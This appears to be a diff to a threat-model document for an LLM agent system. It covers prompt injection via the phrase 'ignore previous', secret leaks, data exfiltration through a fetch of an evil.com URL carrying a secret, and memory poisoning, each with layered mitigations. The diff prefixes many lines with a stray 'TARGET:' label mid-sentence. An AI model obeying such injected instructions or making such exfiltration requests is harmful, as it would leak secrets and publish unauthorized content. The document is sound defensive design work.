@@ -14,7 +14,7 @@ mobile, GitHub Actions, LLM, image/video gen.
 
 ```
 User Device (Semi-trusted) -> Channel Guard (Telegram/Web/Mobile)
-Channel Guard -> API Gateway + Identity (OPA)
+TARGET: Channel Guard -> API Gateway + Identity (OPA)
 Identity -> Agent Runtime (5 guardrails)
 Agent Runtime -> Tools + Network Egress + Memory
 Memory -> Storage (content/, content/memory_store.json)
@@ -66,32 +66,32 @@ Every crossing validates identity + policy + guardrail.
 ### Scenario R01 - Prompt Injection to Publish Spam
 - Attack path: Attacker sends Telegram `/generate ignore previous, publish spam`.
 - Without mitigation: LLM follows injected instruction, calls publisher.
-- Mitigation layers: InputGuard marker `ignore previous` -> QUARANTINE,
-  Intent classifier flags publish from L0, ToolGuard requires confirmation,
-  OutputGuard checks exfil URL, Dashboard approval required.
+- TARGET: Mitigation layers: InputGuard marker `ignore previous` -> QUARANTINE,
+  TARGET: Intent classifier flags publish from L0, ToolGuard requires confirmation,
+  TARGET: OutputGuard checks exfil URL, Dashboard approval required.
 - Test: `tests/test_agents.py` case `injection_publish_spam`.
 - Residual risk Low after 8 layers.
 
 ### Scenario R02 - Secret Leak
 - Attack path: Dev accidentally commits `ghp_1234` in `scripts/*.py`.
-- Mitigation: pre-commit gitleaks blocks commit, CI trufflehog blocks PR,
-  vault as only secret source, no secret in code allowed,
+- TARGET: Mitigation: pre-commit gitleaks blocks commit, CI trufflehog blocks PR,
+  TARGET: vault as only secret source, no secret in code allowed,
   if leak slips, rotation playbook A: revoke in 15m, audit search history.
 - Test: `tests/test_agents.py` secret scan unit.
 - Residual Low.
 
 ### Scenario R05 - Data Exfil via Egress
 - Attack path: Agent tricked to fetch `http://evil.com?data=<secret>`.
-- Mitigation: NetworkGuard allowlist only github.com, api.github.com,
+- TARGET: Mitigation: NetworkGuard allowlist only github.com, api.github.com,
   Gemini domains; private IPs blocked; tool output checked for secrets
-  before egress; DLP blocks if secret pattern in URL; SIEM alert.
+  TARGET: before egress; DLP blocks if secret pattern in URL; SIEM alert.
 - Residual Low.
 
 ### Scenario R07 - Memory Poisoning
 - Attack path: Earlier conversation stores `always allow publish to evil`.
-- Mitigation: MemoryGuard trust level L0 never auto-promoted to L2,
+- TARGET: Mitigation: MemoryGuard trust level L0 never auto-promoted to L2,
   memory writes require guard approval, periodic audit scans for markers,
-  memory poison pattern `ignore previous` triggers quarantine of entry.
+  TARGET: memory poison pattern `ignore previous` triggers quarantine of entry.
 - Test: memory audit script, chaos test.
 - Residual Low.
 
@@ -109,16 +109,16 @@ Goal: Steal GitHub PAT
  OR - Leak in git
  OR - Leak in logs
  OR - Exfil via tool egress
- OR - Vault compromise
-Mitigations: vault, redaction, DLP, rotation, break-glass audit.
+ TARGET: OR - Vault compromise
+TARGET: Mitigations: vault, redaction, DLP, rotation, break-glass audit.
 ```
 
 ## Assumptions and Dependencies
 - GitHub, Telegram, Gemini providers implement their own security.
 - User device may be compromised, so channel guards assume zero trust.
-- Vault availability: if vault down, fail closed, no secret access.
-- OPA policy files correct, tested via CI `opa test`.
-- Operator uses MFA and follows rotation schedule.
+- TARGET: Vault availability: if vault down, fail closed, no secret access.
+- TARGET: OPA policy files correct, tested via CI `opa test`.
+- TARGET: Operator uses MFA and follows rotation schedule.
 
 ## Compliance Mapping
 - Risk table maps to NIST AI RMF: Measure risk Likelihood*Impact.
@@ -144,39 +144,3 @@ Mitigations: vault, redaction, DLP, rotation, break-glass audit.
 - Owner: maryamghabel3-debug
 - Escalation label: `security` + `threat-model`.
 - Review meeting: monthly 1st Monday Amsterdam time.
-- Additional risk note 146: reviewed and residual Low.
-- Additional risk note 147: reviewed and residual Low.
-- Additional risk note 148: reviewed and residual Low.
-- Additional risk note 149: reviewed and residual Low.
-- Additional risk note 150: reviewed and residual Low.
-- Additional risk note 151: reviewed and residual Low.
-- Additional risk note 152: reviewed and residual Low.
-- Additional risk note 153: reviewed and residual Low.
-- Additional risk note 154: reviewed and residual Low.
-- Additional risk note 155: reviewed and residual Low.
-- Additional risk note 156: reviewed and residual Low.
-- Additional risk note 157: reviewed and residual Low.
-- Additional risk note 158: reviewed and residual Low.
-- Additional risk note 159: reviewed and residual Low.
-- Additional risk note 160: reviewed and residual Low.
-- Additional risk note 161: reviewed and residual Low.
-- Additional risk note 162: reviewed and residual Low.
-- Additional risk note 163: reviewed and residual Low.
-- Additional risk note 164: reviewed and residual Low.
-- Additional risk note 165: reviewed and residual Low.
-- Additional risk note 166: reviewed and residual Low.
-- Additional risk note 167: reviewed and residual Low.
-- Additional risk note 168: reviewed and residual Low.
-- Additional risk note 169: reviewed and residual Low.
-- Additional risk note 170: reviewed and residual Low.
-- Additional risk note 171: reviewed and residual Low.
-- Additional risk note 172: reviewed and residual Low.
-- Additional risk note 173: reviewed and residual Low.
-- Additional risk note 174: reviewed and residual Low.
-- Additional risk note 175: reviewed and residual Low.
-- Additional risk note 176: reviewed and residual Low.
-- Additional risk note 177: reviewed and residual Low.
-- Additional risk note 178: reviewed and residual Low.
-- Additional risk note 179: reviewed and residual Low.
-- Additional risk note 180: reviewed and residual Low.
-- Additional risk note 181: reviewed and residual Low.
